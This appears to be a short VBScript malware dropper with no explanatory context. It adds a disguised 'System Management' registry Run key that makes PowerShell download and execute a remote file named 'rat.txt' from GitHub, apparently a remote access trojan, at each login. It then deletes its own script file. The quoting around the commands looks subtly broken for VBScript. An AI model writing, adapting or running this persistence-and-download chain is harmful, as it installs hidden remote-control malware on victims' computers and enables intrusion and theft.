Set objShell = CreateObject("WScript.Shell")
objShell.Run 'cmd.exe /c reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "System Management" /t REG_SZ /d "powershell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/NE1W01F/EXE/master/rat.txt');"', 0
objShell.Run 'cmd.exe /c del temp.vbs'
